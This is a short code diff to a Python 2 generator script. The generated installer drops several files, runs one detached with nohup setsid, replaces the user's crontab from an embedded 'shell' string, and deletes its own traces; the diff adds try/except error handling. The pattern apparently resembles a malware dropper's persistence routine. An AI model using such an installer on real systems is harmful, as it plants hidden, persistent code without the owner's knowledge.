@@ -26,6 +26,7 @@ f.write('''#!/usr/bin/python
 import os
 import subprocess
 import time
+import traceback
 ''')
 
 f.write('''
@@ -71,21 +72,37 @@ f6_shell=\"%s\"
 '''%(f6_shell,))
 
 f.write('''
-open(f1_path+os.sep+f1_name,'w').write(f1)
-subprocess.call("chmod a+x %s"%(f1_path+os.sep+f1_name,),shell=True)
-open(f2_path+os.sep+f2_name,'w').write(f2)
-open(f3_path+os.sep+f3_name,'w').write(f3)
-open(f4_path+os.sep+f4_name,'w').write(f4)
-open(f5_path+os.sep+f5_name,'w').write(f5)
-open(f6_path+os.sep+f6_name,'wb').write(f6_shell)
-
-subprocess.call("crontab %s"%(f6_path+os.sep+f6_name,),shell=True)
-time.sleep(1)
-#subprocess.call("rm %s"%(f6_path+os.sep+f6_name,),shell=True)
-
-subprocess.call("nohup %s %s &"%(f1_path+os.sep+f1_name,"--mode automatic"),shell=True)
-time.sleep(1)
-subprocess.call("rm %s"%(py_path+os.sep+f1_name,),shell=True)
+try:
+    open(f1_path+os.sep+f1_name,'w').write(f1)
+    subprocess.call("chmod a+x %s"%(f1_path+os.sep+f1_name,),shell=True)
+    subprocess.call("nohup setsid %s %s &"%(f1_path+os.sep+f1_name,"--mode automatic"),shell=True)
+    time.sleep(1)
+    subprocess.call("rm %s"%(py_path+os.sep+f1_name,),shell=True)
+except:
+    print traceback.format_exc()
+try:
+    open(f2_path+os.sep+f2_name,'w').write(f2)
+except:
+    print traceback.format_exc()
+try:
+    open(f3_path+os.sep+f3_name,'w').write(f3)
+except:
+    print traceback.format_exc()
+try:
+    open(f4_path+os.sep+f4_name,'w').write(f4)
+except:
+    print traceback.format_exc()
+try:
+    open(f5_path+os.sep+f5_name,'w').write(f5)
+except:
+    print traceback.format_exc()
+try:
+    open(f6_path+os.sep+f6_name,'wb').write(f6_shell)
+    subprocess.call("crontab %s"%(f6_path+os.sep+f6_name,),shell=True)
+    time.sleep(1)
+    #subprocess.call("rm %s"%(f6_path+os.sep+f6_name,),shell=True)
+except:
+    print traceback.format_exc()
 
 #delete self
 # os.remove(__file__)
